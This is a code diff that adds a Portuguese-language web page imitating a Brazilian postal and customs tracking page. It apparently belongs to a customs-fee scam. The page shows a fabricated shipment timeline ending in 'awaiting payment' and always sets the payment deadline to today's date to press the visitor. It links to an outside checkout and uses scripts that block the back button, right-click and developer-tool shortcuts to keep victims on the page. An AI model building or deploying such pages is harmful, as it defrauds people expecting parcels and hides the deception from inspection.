@@ -1,0 +1,195 @@
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR"><head>
+    <meta charset="UTF-8">
+
+    <title>Rastreamento</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="max-image-preview:large">
+    
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:400,700&amp;display=swap">
+
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            background-color: #f4f4f4;
+            overflow-x: hidden; /* Remove scroll horizontal */
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+        }
+
+        .rotulo20 {
+            text-align: center;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 90%;
+            margin-bottom: 20px;
+        }
+
+      
+
+      
+        .gif-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 20px 0;
+        }
+
+        .gif-container img {
+    max-width: 100%; /* Ajuste o tamanho do GIF conforme necessário */
+    position: relative; /* Permite o uso de propriedades de posicionamento */
+    left: -10px; /* Move o GIF 10 pixels para a esquerda */
+}
+
+    </style>
+
+    <script>
+        // Impedir o uso do atalho de teclado para abrir as ferramentas de desenvolvedor
+        document.onkeydown = function(e) {
+            if (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 67 || e.keyCode === 83 || e.keyCode === 73 || e.keyCode === 123)) {
+                return false;
+            }
+        };
+
+        // Impedir o clique com o botão direito do mouse
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // Substituir o comportamento padrão do botão de voltar
+        history.pushState(null, null, location.href);
+        window.onpopstate = function(event) {
+            history.go(1); // Impede o retorno para trás
+        };
+
+        // Função para armazenar a posição da página
+        function savePageState() {
+            localStorage.setItem('scrollPosition', window.scrollY);
+        }
+
+        // Função para restaurar a posição da página
+        function restorePageState() {
+            var scrollPosition = localStorage.getItem('scrollPosition');
+            if (scrollPosition) {
+                window.scrollTo(0, scrollPosition);
+                localStorage.removeItem('scrollPosition'); // Limpa o localStorage após restaurar
+            }
+        }
+
+        // Evento para salvar a posição ao sair da página
+        window.addEventListener('beforeunload', savePageState);
+
+        // Evento para restaurar a posição ao carregar a página
+        window.addEventListener('load', restorePageState);
+    </script>
+</head>
+<body>
+    <img src="images/alfandega-alfa-ca.jpg" alt="Cabeçalho Rastreamento">
+
+    <main>
+        <div class="rotulo20" id="payment-message-container">
+            <div class="rotulo" id="payment-message"><p>Realizar pagamento até o dia de hoje <span>(12/07/2024)</span> para liberar o envio do seu produto.</p></div>
+            <div class="gif-container">
+                <img src="images/fdasfawgif.gif" alt="Aguardando Pagamento">
+            </div>
+        </div>
+
+    
+
+        <div class="rotulo20">
+            <a href="https://www.pay-pagamentos.link/checkout/83fbb4b8-5ae1-466e-9c75-e49e2436676a" target="_self">
+                <img src="images/BOTAOPRAZO.jpg" alt="Botão Pagamento">
+            </a>
+        </div>
+    <script>
+        // Função para formatar a data atual
+        function formatarDataAtual() {
+            const data = new Date();
+            const dia = String(data.getDate()).padStart(2, '0');
+            const mes = String(data.getMonth() + 1).padStart(2, '0'); // Janeiro é 0!
+            const ano = data.getFullYear();
+            return `${dia}/${mes}/${ano}`;
+        }
+
+        // Inserir a data atual na mensagem
+        document.addEventListener("DOMContentLoaded", function() {
+            const mensagem = document.getElementById("payment-message");
+            const dataAtual = formatarDataAtual();
+            mensagem.innerHTML = `<p>Realizar pagamento até o dia de hoje <span>(${dataAtual})</span> para liberar o envio do seu produto.</p>`;
+        });
+    </script>
+
+
+
+
+
+
+<!-- Adiciona um espaçamento de duas linhas -->
+<br>
+<br>
+<link rel="stylesheet" href="css/styles.css">
+
+    <div class="tracking-container">
+        <div class="tracking-item">
+            <div class="icon-posted"></div>
+            <div class="status">
+                <h3>Objeto Postado</h3>
+                <p>China</p>
+                <p class="date" id="date-posted"></p>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <div class="line"></div>
+            <div class="icon-transit"></div>
+            <div class="status">
+                <h3>Objeto em Trânsito - Por favor aguardar</h3>
+                <p>Unidade de Tratamento Internacional - BR CHINA</p>
+                <p class="date" id="date-transit"></p>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <div class="line"></div>
+            <div class="icon-received"></div>
+            <div class="status">
+                <h3>Objeto Recebido pelos Correios do Brasil</h3>
+                <p>CURITIBA-PR</p>
+                <p class="date" id="date-received"></p>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <div class="line"></div>
+            <div class="icon-customs"></div>
+            <div class="status">
+                <h3>Encaminhado para Fiscalização Aduaneira</h3>
+                <p>CURITIBA-PR</p>
+                <p class="date" id="date-customs"></p>
+            </div>
+        </div>
+        <div class="tracking-item">
+            <div class="line"></div>
+            <div class="icon-payment"></div>
+            <div class="status">
+                <h3>Aguardando Pagamento</h3>
+                <p>CURITIBA-PR</p>
+                <p class="date" id="date-payment"></p>
+            </div>
+        </div>
+    </div>
+    <img src="images/rodape.jpg" alt="Cabeçalho Rastreamento">
+</main>
+
+    <script src="js/script.js"></script>
+
+
+
+</body></html>
